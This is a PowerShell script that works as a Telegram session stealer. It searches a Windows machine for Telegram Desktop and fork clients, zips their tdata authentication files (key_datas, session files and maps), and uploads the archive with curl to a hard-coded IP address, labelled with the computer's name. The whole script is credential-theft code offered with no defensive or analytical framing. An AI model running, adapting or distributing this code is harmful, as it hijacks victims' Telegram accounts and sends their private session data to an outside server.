# Telegram/AyuGram tdata auth only:
#   tdata/key_datas
#   tdata/<16hex>s
#   tdata/<16hex>/maps

$ErrorActionPreference = 'Continue'
$RelayUrl = "http://89.34.90.212:8000/sendDocument"
$flag = "$env:TEMP\tdata_sent34.flag"
$zip  = "$env:TEMP\tdata_asd124433.zip"

if (Test-Path $flag) {
    Write-Host "Already sent, skip"
    return
}

function Test-Hex16 {
    param([string]$Name, [bool]$AllowS)
    if ([string]::IsNullOrWhiteSpace($Name)) { return $false }
    $n = $Name.Length
    if ($AllowS -and $n -eq 17 -and ($Name[16] -eq 's' -or $Name[16] -eq 'S')) { $n = 16 }
    if ($n -ne 16) { return $false }
    return ($Name.Substring(0, 16) -match '^[0-9A-Fa-f]{16}$')
}

function Add-TdataRoot {
    param([System.Collections.Generic.List[string]]$Roots, [string]$Path)
    if (-not $Path -or -not (Test-Path -LiteralPath $Path)) { return }
    $full = (Resolve-Path -LiteralPath $Path).Path
    foreach ($r in $Roots) {
        if ($r.Equals($full, [StringComparison]::OrdinalIgnoreCase)) { return }
    }
    $Roots.Add($full)
}

function Find-TdataRoots {
    $roots = [System.Collections.Generic.List[string]]::new()

    foreach ($name in @('Telegram', 'AyuGram', 'AyuGram Desktop', '64Gram', 'Kotatogram')) {
        Get-Process -Name $name -ErrorAction SilentlyContinue | ForEach-Object {
            if ($_.Path) {
                Add-TdataRoot $roots (Join-Path (Split-Path $_.Path -Parent) 'tdata')
            }
        }
    }

    $rel = @(
        'Telegram Desktop\tdata',
        'Telegram Desktop A\tdata',
        '64Gram Desktop\tdata',
        'Kotatogram Desktop\tdata',
        'AyuGram Desktop\tdata',
        'AyuGram\tdata',
        'Telegram Desktop Beta\tdata'
    )
    foreach ($r in $rel) {
        Add-TdataRoot $roots (Join-Path $env:APPDATA $r)
        Add-TdataRoot $roots (Join-Path $env:LOCALAPPDATA $r)
    }

    Get-ChildItem "$env:LOCALAPPDATA\Packages\TelegramMessengerLLP.TelegramDesktop_*" -Directory -ErrorAction SilentlyContinue |
        Select-Object -First 1 |
        ForEach-Object {
            Add-TdataRoot $roots (Join-Path $_.FullName 'LocalCache\Roaming\Telegram Desktop UWP\tdata')
        }

    return $roots
}

function Add-ZipFile {
    param($Archive, [string]$FullPath, [string]$ZipName)
    if (-not (Test-Path -LiteralPath $FullPath)) { return $false }
    try {
        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile(
            $Archive, $FullPath, $ZipName, 'Optimal'
        ) | Out-Null
        Write-Host "Added: $ZipName"
        return $true
    } catch {
        Write-Host "Skip locked: $ZipName"
        return $false
    }
}

$roots = Find-TdataRoots
if ($roots.Count -eq 0) {
    Write-Host "ERROR: tdata folder not found."
    exit 1
}

if (Test-Path $zip) { Remove-Item $zip -Force }

Add-Type -AssemblyName System.IO.Compression.FileSystem
$archive = [System.IO.Compression.ZipFile]::Open($zip, 'Create')
$added = 0

try {
    $i = 0
    foreach ($source in $roots) {
        $i++
        $prefix = if ($roots.Count -eq 1) { 'tdata' } else { "tdata$i" }
        Write-Host "Scan: $source"

        $keyDatas = Join-Path $source 'key_datas'
        if (Add-ZipFile $archive $keyDatas "$prefix/key_datas") { $added++ }

        Get-ChildItem -LiteralPath $source -File -ErrorAction SilentlyContinue | ForEach-Object {
            if (-not (Test-Hex16 $_.Name $true)) { return }
            if ($_.Name.Length -ne 17) { return }
            $accDir = Join-Path $source $_.Name.Substring(0, 16)
            if (-not (Test-Path -LiteralPath $accDir)) { return }
            if (Add-ZipFile $archive $_.FullName "$prefix/$($_.Name)") { $added++ }
        }

        Get-ChildItem -LiteralPath $source -Directory -ErrorAction SilentlyContinue | ForEach-Object {
            if (-not (Test-Hex16 $_.Name $false)) { return }
            $maps = Join-Path $_.FullName 'maps'
            if (Add-ZipFile $archive $maps "$prefix/$($_.Name)/maps") { $added++ }
        }
    }
} finally {
    $archive.Dispose()
}

if ($added -eq 0) {
    Write-Host "ERROR: no auth files found."
    if (Test-Path $zip) { Remove-Item $zip -Force }
    exit 1
}

Write-Host "Archive: $zip ($added files, $((Get-Item $zip).Length) bytes)"

$caption = "PC: $env:COMPUTERNAME | $(Get-Date -Format 'yyyy-MM-dd HH:mm')"
$args = @(
    "-s", "-S", "-X", "POST", $RelayUrl,
    "-F", "document=@$zip",
    "-F", "caption=$caption",
    "--connect-timeout", "10",
    "--max-time", "30"
)
$response = curl.exe @args

if ($response -match '"ok":true') {
    Write-Host "Sent OK"
}
New-Item -Path $flag -ItemType File -Force | Out-Null
